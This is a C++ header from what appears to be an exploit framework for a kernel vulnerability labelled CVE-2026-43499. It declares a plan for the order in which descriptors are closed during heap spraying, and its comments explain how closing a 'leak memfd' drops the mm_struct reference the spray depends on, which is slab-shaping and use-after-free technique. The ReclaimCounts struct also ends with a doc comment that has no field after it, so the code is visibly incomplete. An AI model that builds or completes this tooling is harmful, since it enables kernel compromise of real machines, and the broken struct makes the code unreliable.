#pragma once
/** @file memory/reclaim_plan.hpp
 *  Which descriptors a page preparation gives back, and in what order.
 *
 *  Closing is not cleanup here, it is part of the mechanism: the references the
 *  spray depends on are dropped by closing, and the retired tree says so in a
 *  comment beside the loop -- closing the snitch child's memfd is what drops the
 *  mm_struct reference the spray relies on. So the set and the order are a rule to
 *  be written down and tested rather than a tidy-up left to whoever edits next.
 *
 *  The rule, as the retired tree performed it: every memory descriptor of the
 *  pre-spray children, then every one of the post-spray children EXCEPT the last,
 *  then every Nth of the spray children (one per slab), then both ends of the
 *  shaping socket pair, and last the leak memfd -- the one that matters.
 *
 *  Nothing here opens or closes anything: this is the decision, and the caller
 *  walks it against whatever descriptors it holds, so a fake table can drive the
 *  whole rule without a kernel.
 */
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43499::memory {
    /** How many descriptors each group holds. */
    struct ReclaimCounts final {
        std::size_t pre = 0U;
        std::size_t post = 0U;
        std::size_t spray = 0U;
        /** One spray descriptor is kept per this many. */
        std::size_t mm_objs_per_slab = 0U;
        /** Whether the shaping pair was opened at all. */
        bool shaped = false;
        /** Whether the leak descriptor is held here. */
    };

    /** Where one step of the plan points. */
    enum class ReclaimGroup : unsigned char { Pre = 0, Post = 1, Spray = 2, Shaping = 3, Leak = 4 };

    struct ReclaimStep final {
        ReclaimGroup group = ReclaimGroup::Pre;
        /** Index within the group. */
        std::size_t index = 0U;
    };

    /** Why a plan could not be produced. Names follow the single table. */
    enum class ReclaimVerdict : unsigned char { Ok = 0, NoRoom = 1, CountsInvalid = 2 };

    [[nodiscard]] constexpr const char *reclaim_verdict_name(ReclaimVerdict verdict) noexcept {
        switch (verdict) {
            case ReclaimVerdict::Ok: return "ok";
            case ReclaimVerdict::NoRoom: return "budget-exceeded";
            case ReclaimVerdict::CountsInvalid: return "param-invalid";
        }
        return "unknown";
    }

    /** The most steps a plan can hold: the caller sizes its array, and a plan that
     *  would not fit is refused rather than truncated. */
    inline constexpr std::size_t kMaxReclaimSteps = 64U;

    /** Write the close plan for these counts. */
    [[nodiscard]] ReclaimVerdict plan_reclaim(const ReclaimCounts &counts, ReclaimStep *out,
                                             std::size_t capacity, std::size_t &written) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::memory
